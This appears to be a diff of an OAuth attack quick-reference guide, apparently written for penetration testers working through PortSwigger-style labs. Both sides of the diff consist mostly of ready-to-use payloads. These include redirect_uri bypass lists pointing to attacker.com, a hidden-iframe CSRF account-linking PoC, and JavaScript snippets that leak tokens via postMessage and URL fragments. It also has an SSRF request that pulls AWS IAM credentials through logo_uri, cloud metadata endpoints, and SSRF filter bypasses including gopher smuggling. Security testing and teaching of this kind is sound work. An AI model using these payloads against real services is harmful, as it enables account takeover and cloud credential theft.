@@ -1,224 +1,178 @@
-# OAuth Authentication - Quick-Start Guide
+# OAuth — Quick Start
 
-## OAuth Attack Quick Reference
+Quick-reference card. Per-technique scenarios in `scenarios/oauth/`. See `authentication-principles.md` for decision tree.
 
-| Attack | Time | Key Technique |
-|--------|------|---------------|
-| Implicit Flow Bypass | 5 min | Parameter manipulation |
-| Forced Profile Linking (CSRF) | 10 min | Missing state parameter |
-| redirect_uri Hijacking | 5 min | redirect_uri validation bypass |
-| Proxy Page Token Theft | 15 min | Directory traversal + postMessage |
-| Open Redirect Token Theft | 15 min | Chained vulnerabilities |
-| SSRF via Client Registration | 10 min | OpenID dynamic registration SSRF |
+## Quick attack matrix
 
----
+| Attack | Time | Scenario |
+|---|---|---|
+| Missing state → CSRF | 5 min | `scenarios/oauth/csrf-state.md` |
+| redirect_uri hijacking | 5 min | `scenarios/oauth/redirect-uri-manipulation.md` |
+| Implicit flow token theft | 10 min | `scenarios/oauth/implicit-flow-attacks.md` |
+| Code theft via postMessage | 15 min | `scenarios/oauth/code-theft-postmessage.md` |
+| PKCE bypass | 10 min | `scenarios/oauth/pkce-downgrade.md` |
+| Scope escalation | 5 min | `scenarios/oauth/scope-escalation.md` |
+| SSRF via client registration | 10 min | `scenarios/oauth/ssrf-client-registration.md` |
+| Token + parameter manipulation | 5 min | `scenarios/oauth/parameter-manipulation.md` |
 
-## 5-Minute OAuth Vulnerability Check
-
-### Quick Win Checklist
-
-**1. Missing state Parameter (2 minutes)**
-```http
-# Check authorization request
-GET /auth?client_id=...&redirect_uri=...&response_type=code
-
-# If no &state= parameter → CSRF vulnerability!
-```
-
-**2. redirect_uri Validation (2 minutes)**
-```http
-# Test in Burp Repeater
-GET /auth?...&redirect_uri=https://attacker.com
-
-# If redirect works → Critical vulnerability
-```
-
-**3. Implicit Flow Misuse (1 minute)**
-```http
-# Check for tokens in URL
-https://app.com/callback#access_token=...
-
-# If present → Prefer authorization code flow
-```
-
----
-
-## Emergency Cheat Sheet
-
-### Common OAuth Endpoints
-
-```
-# OpenID Discovery
-GET /.well-known/openid-configuration
-
-# Authorization
-GET /auth?client_id=ID&redirect_uri=URI&response_type=code&scope=openid
-
-# Token Exchange (Code Flow)
-POST /token
-code=AUTH_CODE&client_id=ID&client_secret=SECRET&redirect_uri=URI
-
-# User Info
-GET /userinfo
-Authorization: Bearer ACCESS_TOKEN
-
-# Alternative User Endpoint
-GET /me
-Authorization: Bearer ACCESS_TOKEN
-
-# Client Registration (OpenID)
-POST /reg
-Content-Type: application/json
-{"redirect_uris":["https://example.com"]}
-```
-
-### Burp Suite Shortcuts
-
-```
-# Send to Repeater
-Ctrl/Cmd + R
-
-# Send to Intruder
-Ctrl/Cmd + I
-
-# URL Decode
-Ctrl/Cmd + Shift + U
-
-# Base64 Decode
-Burp Decoder → Select text → Smart decode
-
-# Request in Browser
-Right-click request → Request in browser → In original session
-```
-
-### Parameter Manipulation Quick Tests
-
-```http
-# Test 1: redirect_uri bypass
-&redirect_uri=https://attacker.com
-
-# Test 2: Directory traversal
-&redirect_uri=https://victim.com/callback/../evil
-
-# Test 3: Open redirect chain
-&redirect_uri=https://victim.com/redirect?url=https://attacker.com
-
-# Test 4: Remove state parameter
-DELETE &state=... from authorization request
-
-# Test 5: Scope escalation
-&scope=admin+delete_users
-
-# Test 6: Email manipulation
-{"email":"victim@example.com","token":"attacker_token"}
-```
-
-### Token Extraction Patterns
-
-**Pattern 1: postMessage Leak**
-```javascript
-window.addEventListener('message', function(e) {
-    fetch("/?leak=" + encodeURIComponent(e.data.data))
-})
-```
-
-**Pattern 2: URL Fragment Extraction**
-```javascript
-if (window.location.hash) {
-    window.location = '/?token=' + window.location.hash.substring(1)
-}
-```
-
-**Pattern 3: Iframe Trigger**
-```html
-<iframe src="OAUTH_AUTHORIZATION_URL_HERE"></iframe>
-```
-
-### AWS Metadata SSRF Targets
+## 5-minute smoke test
 
 ```bash
-# IAM Role List
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# 1. Discovery
+curl https://target/.well-known/openid-configuration | jq
+# Note: authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint,
+#       supported response_types, code_challenge_methods_supported
 
-# IAM Credentials (replace ROLE with actual role name)
-http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role/
+# 2. Missing state?
+GET /auth?client_id=...&redirect_uri=...&response_type=code
+#                                                              ^^^ no &state= ?
 
-# Instance Metadata
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/user-data
-```
+# 3. Test redirect_uri injection
+?redirect_uri=https://attacker.com
+?redirect_uri=https://target.com.attacker.com
+?redirect_uri=https://target.com@attacker.com
 
-### One-Liner Attack Patterns
+# 4. Implicit flow allowed?
+?response_type=token   → tokens land in URL fragment
 
-**Implicit Flow Parameter Manipulation:**
-```
-POST /authenticate → Change email to victim@example.com → Keep original token → Send request
-```
-
-**CSRF Profile Linking:**
-```
-Intercept /oauth-linking?code=X → Drop request → Create <iframe src="...?code=X"> → Deliver to victim
+# 5. PKCE optional?
+# Send token request without code_verifier — if 200, PKCE not enforced
 ```
 
-**SameSite=Lax Bypass (Re-Linking via Same-Origin Primitive):**
+## redirect_uri bypass payloads
+
 ```
-SameSite=Lax blocks cross-site sub-requests but allows top-level GETs.
-If you have a same-origin injection point (stored XSS, open redirect, AngularJS ng-include):
-  window.location = '/accounts/oauth2/<provider>/callback/?code=<ATTACKER_CODE>'
-→ victim's Lax cookies are sent (same-origin top-level nav)
-→ callback links attacker's external identity to victim session
-→ attacker logs in via provider, is now authenticated as victim (often admin)
-Requires: missing/unvalidated state parameter. SameSite=Strict DOES block this.
+# Complete bypass
+https://attacker.com
+
+# Prefix matching
+https://target.com.attacker.com
+https://target.com@attacker.com
+https://target.com%2eattacker.com
+https://target-com.attacker.com
+
+# Directory traversal
+https://target.com/oauth-callback/../
+https://target.com/oauth-callback/../evil
+https://target.com/oauth-callback/..%2fevil
+https://target.com/oauth-callback/..;/evil
+https://target.com/oauth-callback/....//
+
+# Subdomain
+https://evil.target.com
+https://target.evil.com
+
+# Parameter pollution
+?redirect_uri=https://target.com&redirect_uri=https://attacker.com
+
+# Fragment / path confusion
+https://target.com/callback%23@attacker.com
+https://target.com//attacker.com
+https://target.com\attacker.com
+https://target.com/.attacker.com
+
+# URL encoding
+https://target.com/%2f/attacker.com
+https://target.com%2f%2fattacker.com
+
+# Case
+https://TARGET.COM
+https://Target.Com
+
+# Port / userinfo
+https://target.com:443@attacker.com
+https://target.com:8080/callback
+
+# Open redirect chain
+https://target.com/redirect?url=https://attacker.com
+https://target.com/post/next?path=https://attacker.com
 ```
 
-**redirect_uri Hijacking:**
-```
-Test redirect_uri=attacker-server in Repeater → Create iframe → Deliver → Use stolen code in /oauth-callback?code=X
+## CSRF account-linking PoC
+
+```html
+<!-- Pre-authorize attacker → get attacker code → trick victim to follow link -->
+<iframe
+    src="https://target.com/oauth-linking?code=ATTACKER_AUTHORIZATION_CODE"
+    style="display:none;">
+</iframe>
 ```
 
-**Token Theft via postMessage:**
-```
-redirect_uri=.../callback/../comment-form → Add postMessage listener → Deliver → Decode logs → Use token on /me
+When victim has session, the iframe completes the link silently.
+
+## SameSite=Lax bypass (re-linking via top-level navigation)
+
+```javascript
+// Same-origin XSS or open redirect on victim domain triggers:
+window.location = '/accounts/oauth2/<provider>/callback/?code=<ATTACKER_CODE>'
+// Top-level GET → cookies sent (Lax allows it) → callback links attacker identity
 ```
 
-**Token Theft via Open Redirect:**
-```
-redirect_uri=.../callback/../redirect?path=attacker.net → Fragment extractor JS → Deliver → Use token
-```
+## SSRF via dynamic client registration
 
-**SSRF via Client Registration:**
-```
-POST /reg → logo_uri=169.254.169.254/meta-data/iam/... → GET /client/ID/logo → Extract SecretAccessKey
-```
-
----
-
-## Quick Reference Card
-
-### Common OAuth Endpoints
-```
-/.well-known/openid-configuration
-/auth?client_id=...
-/oauth-callback
-/token
-/me or /userinfo
-/reg (client registration)
-/client/ID/logo
-```
-
-### Essential Headers
-```
+```http
+POST /reg HTTP/1.1
 Content-Type: application/json
-Authorization: Bearer TOKEN
+
+{
+  "redirect_uris": ["https://example.com"],
+  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}
+
+# Then trigger fetch:
+GET /client/<RETURNED_CLIENT_ID>/logo HTTP/1.1
+# Response contains AWS credentials
 ```
 
-### Must-Remember Parameters
+Cloud metadata targets:
 ```
-client_id=...
-redirect_uri=...
-response_type=code (or token)
-scope=openid profile email
-state=RANDOM (CSRF protection)
-nonce=RANDOM (replay protection)
+AWS:    http://169.254.169.254/latest/meta-data/
+Azure:  http://metadata.azure.com/metadata/instance?api-version=2021-02-01
+GCP:    http://metadata.google.internal/computeMetadata/v1/
 ```
+
+## SSRF filter bypass
+
+```
+http://0xA9FEA9FE/                       # hex (169.254.169.254)
+http://2852039166/                       # int
+http://[::ffff:169.254.169.254]/         # IPv6
+http://169.254.169.254.xip.io/           # DNS reflector
+gopher://internal:6379/_<commands>       # protocol smuggling
+```
+
+## OAuth endpoints / params
+
+```
+/.well-known/openid-configuration         # Discovery
+/.well-known/jwks.json                    # Public keys
+/auth, /authorize                         # Authorization
+/token                                    # Token endpoint
+/userinfo, /me                            # User info
+/introspect, /revoke                      # Introspection / revocation
+/reg, /register                           # Dynamic registration
+```
+
+Auth params: `client_id`, `redirect_uri`, `response_type` (code/token/id_token), `scope`, `state`, `nonce`, `code_challenge`, `code_challenge_method` (S256/plain), `prompt`.
+
+Token request: `grant_type=authorization_code` + `code` + `redirect_uri` + `client_id`/`client_secret` + `code_verifier` (PKCE).
+
+## Validation tests
+
+```bash
+GET /callback?code=$CODE&state=ANY_VALUE         # 200 = state not validated
+POST /token (no &code_verifier=)                 # 200 = PKCE optional
+POST /token (same code twice)                    # 200 second = code not single-use
+```
+
+## Burp / Tools
+
+- Burp + JWT Editor + Collaborator for SSRF testing.
+- OAuth Debugger: https://oauthdebugger.com/
+- jwt.io for ID token decode.
+- ngrok for attacker callbacks.
+
+## Resources
+
+- `INDEX.md`, `scenarios/oauth/`, `oauth-resources.md`.
+- PortSwigger Web Security Academy: https://portswigger.net/web-security/oauth
